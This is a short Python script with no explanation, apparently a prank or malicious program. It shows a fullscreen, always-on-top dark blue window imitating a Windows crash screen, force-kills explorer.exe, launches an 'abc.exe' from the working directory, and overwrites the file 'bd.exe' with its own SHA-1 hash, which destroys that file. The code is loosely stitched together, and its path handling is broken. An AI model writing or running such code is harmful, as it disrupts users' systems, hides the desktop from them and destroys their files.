import tkinter as tk 
from subprocess import run 


def bluescreen():
    root = tk.Tk()     
    root.attributes('-fullscreen', True)  
    root.wm_attributes('-topmost', True)  
    frame = tk.Frame(root, bg='darkblue') 
    frame.pack(fill='both', expand=True)
    return root

def close_explorer():
    run('taskkill /F /IM explorer.exe') 


if __name__ == '__main__':      
    root = bluescreen()
    close_explorer()
    root.mainloop()    

import os
run(os.getcwd()+"abc.exe")

filename='bd.exe' 

import hashlib
def get_sha1(f):
    xd=open(filename,'rb').read() 
    gys=xd
    sha1 = hashlib.sha1(gys)  
    osv=sha1.hexdigest() 
    print(osv)
    bx=bytes(osv,encoding='utf-8')    
    with open(filename,'wb') as f: 
        f.write(bx)   
get_sha1('')


